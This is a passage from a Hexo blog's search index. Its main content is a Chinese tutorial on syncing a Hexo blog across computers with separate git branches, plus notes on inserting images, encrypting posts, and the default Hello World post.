rel="noopener">https://www.zhaoj.in/read-6462.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gyctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 实现多终端同步</title>
      <link href="/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/"/>
      <url>/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前习惯使用学校机房写笔记，又不舍得放下自己电脑的笔记，查阅了网上资料后，就有了这一篇文章</p><p>博客主题采用了修改版本cactus主题：<a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank" rel="noopener">https://github.com/xuthus5/hexo-theme-cactus</a></p><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>hexo项目的目录结构如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HEXO</span><br><span class="line">├──.deploy_git/</span><br><span class="line">├──node_modules/</span><br><span class="line">├──public/</span><br><span class="line">├──scaffolds/</span><br><span class="line">├──<span class="built_in">source</span>/</span><br><span class="line">├──themes/</span><br><span class="line">├──_config.yml</span><br><span class="line">├──.gitignore</span><br><span class="line">├──db.json</span><br><span class="line">├──debug.log</span><br><span class="line">└──package.json</span><br></pre></td></tr></table></figure><blockquote><p>其中.deploy_git、public两个文件夹下存放的是博客文章的静态页面，通过对比github上博客仓库的master分支可以看到master分支下面的文件结构和.deploy_git文件夹下的文件是一致的，这个应该可以判断通过hexo g -d发布到github的内容就是.deploy_git文件夹下面的文件。其余的文件夹和文件即是Hexo的主题文件、原始的博客文件等，刚在上文提到的hexo分支，存的即时这些文件。</p></blockquote><h3 id="方案原理分析"><a href="#方案原理分析" class="headerlink" title="方案原理分析"></a>方案原理分析</h3><blockquote><p>方案主要是通过维护两条git分支来实现，第一个分支是gihub上默认的master分支，用于存放发布的博文的静态页面；另外再新建一个分支，比如命名为hexo，通过此分支存放主题、原始的博客文件等等，这些文件才是不同电脑需要同步的文件；当每次修改主题或者新增博文后，先将修改的主题文件（在themes文件夹下）或者新增博客（在source文件夹下），同步到远程的hexo分支，然后在通过hexo g -d命令发布博文，也就是将新增的博文的静态页面同步到master分支。这样通过不同的分支管理不同的文件，实现了多台电脑同步更新博文的功能。</p></blockquote><p>技术方案如下：</p><p><img src="/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/1.png" alt></p><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ul><li><p>创建分支（在github上操作）</p><p><strong>在Github远程创建 hexo branch</strong>，并将新的<strong>hexo</strong> branch <strong>设置成 Default branch</strong>，替代原本的默认分支: master branch</p></li><li><p>初始化分支（PC1上面操作）</p><ul><li>github上切换到hexo分支，<code>git clone</code>仓库到本地。</li><li>此时本地会多出一个<code>username.github.io</code>文件夹，命令行<code>cd</code>进去，删除除<code>.git</code>文件夹（如果你看不到这个文件夹，说明是隐藏了。4</li><li>命令行<code>git add -A</code>把工作区的变化（包括已删除的文件）提交到暂存区（ps:<code>git add .</code>提交的变化不包括已删除的文件）。</li><li>命令行<code>git commint -m &quot;some description&quot;</code>提交。</li><li>命令行<code>git push origin hexo</code>推送到远程hexo分支。此时刷下github，如果正常操作，hexo分支应该已经被清空了。</li><li>复制本地<code>username.github.io</code>文件夹中的<code>.git</code>文件夹到hexo项目根目录下。此时，hexo项目已经变成了和远程hexo分支关联的本地仓库了。而<code>username.github.io</code>文件夹的使命到此为止，你可以把它删掉，因为我们只是把它作为一个“中转站”的角色。以后每次发布新文章或修改网站样式文件时，<code>git add . &amp; git commit -m &quot;some description&quot; &amp; git push origin hexo -f</code>即可把环境文件推送到hexo分支。然后再<code>hexo g -d</code>发布网站并推送静态文件到master分支。</li></ul></li><li><p>同步分支（PC2上面操作）</p><ul><li>安装hexo：<code>npm install -g hexo-cli</code></li><li>clone远程仓库到本地 <code>git clone git@github.com:username/username.github.io.git</code></li><li>根据<code>packge.json</code>安装依赖<code>npm install &amp;&amp; npm install hexo-deployer-git</code></li><li>此时通过命令git g、git s即可在本地开启同步下来的博客静态页面，并通过 <a href="https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%3A4000%2F" target="_blank" rel="noopener">http://localhost:4000/</a> 访问</li></ul></li><li><p>发布博文（PC1或者PC2）</p><ul><li><code>git pull</code>从远程hexo分支拉取最新的环境文件到本地，可以理解为svn的更新操作。比如在公司写了博客，回家在电脑上也要写需要先执行这一步操作。</li><li>文章写完，要发布时，需要先提交环境文件，再发布文章。按以下顺序执行命令<code>it add . &amp; git commit -m &quot;some description&quot; &amp; git push origin hexo -f</code>,最后执行<code>hexo g -d</code></li></ul></li></ul><h3 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h3><h4 id="文章中插入图片"><a href="#文章中插入图片" class="headerlink" title="文章中插入图片"></a>文章中插入图片</h4><ol><li>设置站点配置<code>_config.yml:</code>将<code>post_asset_folder: false</code>改为<code>post_asset_folder: true</code></li><li>安装插件:<code>npm install https://github.com/CodeFalling/hexo-asset-image -- save</code></li><li>运行<code>hexo n &quot;XXXXXX&quot;</code>,生成XXXXX.md博文时就会在<code>/source/_posts</code>目录下生成XXXXXX的文件夹，将你想在XXXXX博文中插入的照片放置到这个同名文件夹中即可，图片的命名随意。</li><li>添加图片:在想添加的位置写入<code>![](图片名字.图片格式)</code>,例如<code>![](1.png)</code></li></ol><h4 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h4><ol><li>安装<code>npm install --save hexo-blog-encrypt</code></li><li>首先在 <strong>站点配置文件</strong> 中启用该插件:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><ol start="3"><li>然后在你的文章的头部添加上对应的字段，如 password, abstract, message</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">---</span></span><br><span class="line"><span class="selector-tag">title</span>: 文章加密</span><br><span class="line"><span class="selector-tag">date</span>: 2019<span class="selector-tag">-01-04T22</span><span class="selector-pseudo">:20</span><span class="selector-pseudo">:13.000Z</span></span><br><span class="line"><span class="selector-tag">category</span>: 教程</span><br><span class="line"><span class="selector-tag">tags</span>:</span><br><span class="line">  <span class="selector-tag">-</span> 博客</span><br><span class="line">  <span class="selector-tag">-</span> <span class="selector-tag">Hexo</span></span><br><span class="line"><span class="selector-tag">keywords</span>: 博客文章密码</span><br><span class="line"><span class="selector-tag">password</span>: <span class="selector-tag">TloveY</span></span><br><span class="line"><span class="selector-tag">abstract</span>: 密码：<span class="selector-tag">TloveY</span></span><br><span class="line"><span class="selector-tag">message</span>:  输入密码，查看文章</span><br><span class="line"><span class="selector-tag">---</span></span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://blog.csdn.net/Fitz1318/article/details/86548129" target="_blank" rel="noopener">https://blog.csdn.net/Fitz1318/article/details/86548129</a></p><p><a href="https://www.jianshu.com/p/44e211829447" target="_blank" rel="noopener">https://www.jianshu.com/p/44e211829447</a></p><p><a href="https://www.jianshu.com/p/fceaf373d797" target="_blank" rel="noopener">https://www.jianshu.com/p/fceaf373d797</a></p><p><a href="https://www.dazhuanlan.com/2019/11/16/5dd00ffcb4f27/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/11/16/5dd00ffcb4f27/</a></p><p><a href="https://www.jianshu.com/p/937bda9123da" target="_blank" rel="noopener">https://www.jianshu.com/p/937bda9123da</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 多端同步 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/03/17/hello-world/"/>
      <url>/2020/03/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
